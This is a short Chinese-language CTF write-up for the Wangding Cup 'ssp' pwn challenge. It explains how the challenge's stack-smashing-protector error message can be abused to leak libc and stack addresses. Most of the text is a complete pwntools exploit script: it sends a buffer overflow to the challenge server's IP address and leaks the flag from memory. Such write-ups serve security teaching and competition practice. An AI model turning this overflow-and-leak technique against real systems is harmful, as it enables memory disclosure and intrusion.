---
title: 网鼎杯第一场SSP
date: 2018-08-24 08:37:40
tags: [CTF, PWN]
categories: 网鼎杯
---
# 网鼎杯第一场 ssp wp

​	首先考虑利用ssp进行泄露，由于flag在栈上，直接写循环leak爆破栈地址，失败，之后考虑爆破canary，爆破失败，而且由于只进行三次fork，所以之后内存数据会更新导致无法进一步泄露，所以放弃爆破canary的思路。<!--more-->之后重新考虑ssp，利用ssp泄露libc函数，然后查找得到libc库，之后能得到libc.environ，泄露libc.environ中保存的地址后，gdb调试一下得到buf偏移，计算得到buf真实地址，最后一次输入淹没泄露buf内容,脚本写的太烂，就不放上来了。

exp如下：

```
#encoding=utf-8
from pwn import *
leaksome={'leak':0}
p = remote('106.75.90.160', 9999)
pop_rdi_ret=0x0000000000400c13
strcmp_got=0x00000602050
gets_plt=0x000000000400830
payload='a'*0x128
payload+=p64(0x000000602048)
p.recvuntil('r guessing flag')
p.sendline(payload)
p.recvuntil('detected ***: ')
leak=u64(p.recv(6).ljust(8,'\x00'))
leaksome['leak']=leak
libc_base=leak-0x20740
env_addr=libc_base+0x00000000003c6f38
payload='a'*0x128
payload+=p64(env_addr)
p.recvuntil('r guessing flag')
p.sendline(payload)
p.recvuntil('detected ***: ')
leak=u64(p.recv(6).ljust(8,'\x00'))
leaksome['leak2']=leak
stack_addr=leak
payload='a'*0x128
payload+=p64(stack_addr-0x168)
p.recvuntil('r guessing flag')
p.sendline(payload)
p.recvuntil('detected ***: ')
print p.recv(1024)

```

